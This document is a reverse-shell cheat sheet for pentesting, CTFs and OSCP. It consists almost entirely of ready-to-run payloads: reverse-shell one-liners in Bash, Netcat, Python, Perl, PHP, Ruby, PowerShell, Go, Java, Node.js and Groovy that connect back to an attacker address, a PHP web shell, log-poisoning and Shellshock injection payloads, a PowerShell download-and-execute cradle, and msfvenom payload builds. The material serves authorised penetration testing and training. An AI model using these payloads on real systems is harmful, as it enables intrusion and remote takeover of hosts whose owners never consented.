# `Reverse Shell (Cheat Sheet)`

__Pentesting - Red Team - CTFs - OSCP__


`Bash`

  ```cmd
  bash -i >& /dev/tcp/192.168.1.2/443 0>&1

  bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"
  
  bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
  ```
  
`Netcat`

  ```cmd
  nc -e /bin/sh 192.168.1.2 443

  nc -e /bin/bash 192.168.1.2 443

  nc -c bash 192.168.1.2 443
  
  nc.exe -e cmd 192.168.1.26 443

  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
  
  rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
  ```
  
`PHP Web Shell`

  ```php
  <?php system($_GET['cmd']); ?>
  ```
  
`Web Shell (SSH Log Poisoning) -> /var/log/auth.log`

  ```php
  ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2
  ```

`Web Shell (HTTP User-Agent Log Poisoning) -> /var/log/apache2/access.log`

  ```cmd
  curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2/browse.php?file=../../../../../var/log/apache2/access.log"
  ```
  
  ```cmd
  User-Agent: <?php system($_GET['cmd']); ?>
  ```
`Shellshock`

  ```cmd
  curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
  
  curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
  ```
  
  `Shellshock (Internal Server Error)`

  ```cmd
  curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
  
  curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.sh"
  
  curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
  
  curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
  ```
  
`Perl`

  ```cmd
  perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```

`Python`

  ```cmd
   export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
  
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
  ```

`PHP`
  ```php
  php -r '$sock=fsockopen("192.168.1.2",443);`/bin/sh -i <&3 >&3 2>&3`;'
  
  php -r '$sock=fsockopen("192.168.1.2",443);exec("/bin/sh -i <&3 >&3 2>&3");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);system("/bin/sh -i <&3 >&3 2>&3");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);passthru("/bin/sh -i <&3 >&3 2>&3");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
  
  php -r '$sock=fsockopen("192.168.1.2",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
  ```
  
`Ruby`

  ```cmd
  ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

  ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

  ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  ```
  
`Xterm`

   ```cmd
   xterm -display 192.168.1.2:443
   ```
   
`Ncat`

  ```cmd
  ncat 192.168.1.2 443 -e /bin/bash
  ```

`Powershell`

  ```powershell
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  
  powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2:8000/reverse.ps1')
  ```

`Awk`

  ```cmd
  awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
  ```
 `Gawk`
 
 ```cmd
 gawk 'BEGIN {P=443;S="> ";H="192.168.1.2";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
 ```
 `Golang`

  ```cmd
  echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
  ```
   `Telnet`

  ```cmd
  rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 443 0/tmp/p
  ```
  ```
  telnet 192.168.1.2 80 | /bin/bash | telnet 192.168.1.2 443
  ```
  
  `Java`

  ```cmd
  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
  p.waitFor()
  ```
  `Node.js`
  
  ```cmd
  require('child_process').exec('bash -i >& /dev/tcp/192.168.1.2/443 0>&1');
  ```
  
`Groovy (Jenkins)`

  ```cmd
  String host="192.168.1.2";
  int port=443;
  String cmd="cmd.exe";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
  ```


`Msfvenom`

`Php`

```cmd
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
```

```cmd
msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
```

`War`

```cmd
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war
```

`JSP`

```cmd
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.jsp
```

`Aspx`

```cmd
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx
```

`Windows`

`Meterpreter (Metasploit Listener multi/handler) [Staged]`

`x86`

```cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
 ```
 
`x64`

```cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

`Shell (Metasploit Listener multi/handler) [Staged]`

`x86`

```cmd
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

`x64`

```cmd
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

`Shell (Netcat Listener) [Stageless]`

`x86`

```cmd
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```
`x64`

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe
```

`Linux`

`Meterpreter (Metasploit Listener multi/handler) [Staged]`

`x86`

```cmd
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

`x64`

```cmd
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

`Shell (Metasploit Listener multi/handler) [Staged]`

`x86`

```cmd
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

`x64`

```cmd
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```

`Shell (Netcat Listener) [Stageless]`

`x86`

```cmd
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elf
```
`x64`

```cmd
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf > reverse.elF
```
